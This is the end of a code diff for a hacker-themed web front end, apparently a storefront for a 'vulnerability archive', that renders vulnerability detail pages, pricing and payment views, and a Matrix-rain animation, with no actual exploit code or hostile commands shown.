+                    const vuln = VULNERABILITIES.find(v => v.id === vulnId);
+                    if (vuln) handleSelectVuln(vuln);
+                });
+            });
+        }
+
+        function renderVulnDetail() {
+            const detailView = document.getElementById('vuln-detail-view');
+            if (!selectedVuln) {
+                detailView.innerHTML = '';
+                return;
+            }
+
+            const vuln = selectedVuln;
+
+            const html = `
+                <div class="max-w-6xl mx-auto px-4">
+                    <button id="return-vault-btn" class="mb-8 flex items-center gap-2 text-slate-500 hover:text-white transition text-sm font-mono uppercase tracking-widest">
+                        ${getIcon('ChevronRight', 'rotate-180', 16)}
+                        Return to Archive
+                    </button>
+
+                    <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+                        <!-- Left Column: Info -->
+                        <div class="lg:col-span-2 space-y-8">
+                            <div>
+                                <div class="flex flex-wrap items-center gap-4 mb-6">
+                                    <h1 class="text-5xl font-black text-white tracking-tighter">${vuln.title}</h1>
+                                    <div class="px-3 py-1 bg-red-500/10 text-red-500 border border-red-500/50 rounded text-xs font-bold font-mono">
+                                        SEVERITY: ${vuln.score}
+                                    </div>
+                                    <div class="px-3 py-1 bg-slate-800 text-slate-300 rounded text-xs font-bold font-mono">
+                                        ${vuln.cve}
+                                    </div>
+                                </div>
+                                <p class="text-xl text-slate-300 leading-relaxed border-l-2 border-purple-500 pl-6 font-light">
+                                    ${vuln.description}
+                                </p>
+                            </div>
+
+                            <!-- CODE SNIPPET SECTION -->
+                            <div class="bg-black rounded-lg border border-slate-800 overflow-hidden shadow-2xl">
+                                <div class="bg-slate-900 px-4 py-2 flex items-center justify-between border-b border-slate-800">
+                                    <h3 class="text-xs font-bold text-slate-400 flex items-center gap-2 uppercase tracking-widest">
+                                        ${getIcon('Terminal', 'text-green-500', 14)}
+                                        Payload / Vector Concept
+                                    </h3>
+                                    <div class="flex gap-1.5">
+                                        <div class="w-2.5 h-2.5 rounded-full bg-slate-700"></div>
+                                        <div class="w-2.5 h-2.5 rounded-full bg-slate-700"></div>
+                                    </div>
+                                </div>
+                                <div class="p-6 font-mono text-sm text-slate-300 overflow-x-auto">
+                                    <p class="text-slate-500 mb-2"># Technical Implementation (Sanitized)</p>
+                                    <p class="text-green-400 typewriter">${vuln.codeSnippet || "// Code censored for security reasons"}</p>
+                                    <p class="mt-4 text-yellow-500 animate-pulse">&gt; EXECUTION HALTED BY SAFEGUARD PROTOCOL_</p>
+                                </div>
+                            </div>
+
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                <div class="bg-slate-900/30 p-6 rounded border border-white/5">
+                                    <h4 class="text-cyan-500 text-xs font-bold mb-3 uppercase tracking-widest flex items-center gap-2">
+                                        ${getIcon('Globe', '', 14)} Real World Impact
+                                    </h4>
+                                    <p class="text-slate-300 text-sm leading-relaxed">${vuln.impact}</p>
+                                </div>
+                                <div class="bg-slate-900/30 p-6 rounded border border-white/5">
+                                    <h4 class="text-red-500 text-xs font-bold mb-3 uppercase tracking-widest flex items-center gap-2">
+                                        ${getIcon('AlertTriangle', '', 14)} Affected Targets
+                                    </h4>
+                                    <div class="flex flex-wrap gap-2">
+                                        ${vuln.affected.map(t => `<span class="px-2 py-1 bg-red-900/20 border border-red-900/30 rounded text-xs text-red-200">${t}</span>`).join('')}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Right Column: 3D & Assets -->
+                        <div class="space-y-6">
+                            <div class="bg-black rounded border border-slate-800 p-1 h-64 relative overflow-hidden flex items-center justify-center">
+                                ${Vault3D()}
+                                <div class="absolute bottom-4 left-0 w-full text-center text-[10px] font-mono text-purple-500/50">
+                                    SECURE CONTAINER: ${vuln.id.toUpperCase()}
+                                </div>
+                                <div class="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-20 pointer-events-none"></div>
+                            </div>
+
+                            <div class="bg-slate-900/50 rounded border border-white/5 p-6">
+                                <h3 class="text-white font-bold mb-4 text-xs uppercase tracking-widest">Evidence Files</h3>
+                                <div class="space-y-3">
+                                    <div class="flex items-center justify-between p-3 bg-slate-800/50 rounded border border-white/5 hover:border-cyan-500/30 cursor-pointer transition group">
+                                        <div class="flex items-center gap-3">
+                                            ${getIcon('Fingerprint', 'text-slate-500 group-hover:text-cyan-400', 16)}
+                                            <span class="text-sm text-slate-300 group-hover:text-white">Technical_Report.pdf</span>
+                                        </div>
+                                        <span class="text-[10px] text-slate-600 font-mono">ENCRYPTED</span>
+                                    </div>
+                                    <div class="flex items-center justify-between p-3 bg-slate-800/50 rounded border border-white/5 hover:border-cyan-500/30 cursor-pointer transition group">
+                                        <div class="flex items-center gap-3">
+                                            ${getIcon('Hash', 'text-slate-500 group-hover:text-cyan-400', 16)}
+                                            <span class="text-sm text-slate-300 group-hover:text-white">IoC_Hashes.txt</span>
+                                        </div>
+                                        <span class="text-[10px] text-slate-600 font-mono">4KB</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `;
+            detailView.innerHTML = html;
+
+            // Adjuntar event listeners
+            detailView.querySelector('#return-vault-btn').addEventListener('click', () => handleViewChange('vault'));
+        }
+
+        /**
+         * Función principal de renderizado de la aplicación.
+         */
+        function renderApp() {
+            // 1. Ocultar todas las vistas
+            document.querySelectorAll('.view-content').forEach(el => el.setAttribute('data-active', 'false'));
+            
+            // 2. Mostrar la vista activa
+            document.getElementById(`${view}-view`)?.setAttribute('data-active', 'true');
+
+            // 3. Renderizar componentes de layout (Navbar)
+            renderNavbar();
+
+            // 4. Renderizar contenido de la vista
+            switch (view) {
+                case 'home':
+                    renderHome();
+                    break;
+                case 'pricing':
+                    renderPricing();
+                    break;
+                case 'vault':
+                    renderVault();
+                    break;
+                case 'vuln-detail':
+                    renderVulnDetail();
+                    break;
+            }
+
+            // 5. Renderizar/Quitar Modales
+            if (modalPlan) {
+                renderPaymentModal();
+            } else {
+                document.getElementById('modal-container').innerHTML = '';
+            }
+        }
+
+        // --- INICIALIZACIÓN DE LA APP ---
+        
+        /**
+         * Inicializa el efecto Matrix Rain en el canvas.
+         */
+        function initMatrixRain() {
+            const canvas = document.getElementById('matrix-rain-canvas');
+            if (!canvas) return;
+
+            const ctx = canvas.getContext('2d');
+            let animationFrameId;
+
+            function resizeCanvas() {
                 canvas.width = window.innerWidth;
                 canvas.height = window.innerHeight;
-            };
-            
-            window.addEventListener('resize', resizeCanvas);
+            }
+
             resizeCanvas();
+            window.addEventListener('resize', resizeCanvas);
 
             const columns = canvas.width / 20;
             const drops = Array(Math.floor(columns)).fill(1);
             const chars = "01010101アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
             
             const draw = () => {
-                ctx.fillStyle = 'rgba(2, 6, 23, 0.05)'; // Color del fondo
+                // Sombra de fondo para el efecto de rastro
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
                 ctx.fillRect(0, 0, canvas.width, canvas.height);
-                ctx.fillStyle = '#0f0'; // Color de los caracteres
+
+                ctx.fillStyle = '#0f0'; // Color del texto verde
                 ctx.font = '15px monospace';
-                
+
                 for(let i = 0; i < drops.length; i++) {
+                    // Selecciona un carácter aleatorio
                     const text = chars[Math.floor(Math.random() * chars.length)];
+                    // Dibuja el carácter
                     ctx.fillText(text, i * 20, drops[i] * 20);
-                    
+
+                    // Reinicia la gota si llega al final o aleatoriamente
                     if(drops[i] * 20 > canvas.height && Math.random() > 0.975) {
                         drops[i] = 0;
                     }
                     drops[i]++;
                 }
+                animationFrameId = requestAnimationFrame(draw);
             };
-            setInterval(draw, 50);
+
+            draw();
+
+            return () => {
+                cancelAnimationFrame(animationFrameId);
+                window.removeEventListener('resize', resizeCanvas);
+            };
         }
 
-        function initApp() {
-            // 1. Mostrar barra de progreso
-            const progressBar = document.getElementById('progress-bar');
-            const loadingText = document.getElementById('loading-text');
-            
-            let loadTime = 0;
-            const totalRecords = VULNERABILITIES.length;
-            
-            const loadingInterval = setInterval(() => {
-                loadTime += 10;
-                if (loadTime > 100) loadTime = 100;
-                
-                progressBar.style.width = \`\${loadTime}%\`;
-                
-                if (loadTime < 50) {
-                    loadingText.textContent = `Loading core modules...`;
-                } else if (loadTime < 90) {
-                    loadingText.textContent = `Indexing \${totalRecords} Secure Records...`;
-                } else {
-                     loadingText.textContent = `System Initialized.`;
-                }
 
-                if (loadTime >= 100) {
-                    clearInterval(loadingInterval);
-                    document.getElementById('preloader').classList.add('hidden');
-                    state.isAuthReady = true;
-                    navigate('home'); // Iniciar en la vista principal
-                    initMatrixRain();
-                }
-            }, 200);
-        }
-
-        // Se ejecuta al cargar la página
-        window.onload = initApp;
+        /**
+         * Inicialización principal después de la carga del DOM.
+         */
+        document.addEventListener('DOMContentLoaded', () => {
+            initMatrixRain();
+            
+            // Simulación de carga (2000ms)
+            setTimeout(() => {
+                document.getElementById('loading-screen').classList.add('hidden');
+                document.getElementById('app-container').classList.remove('hidden');
+                renderApp();
+            }, 2000);
+        });
 
     </script>
 </body>
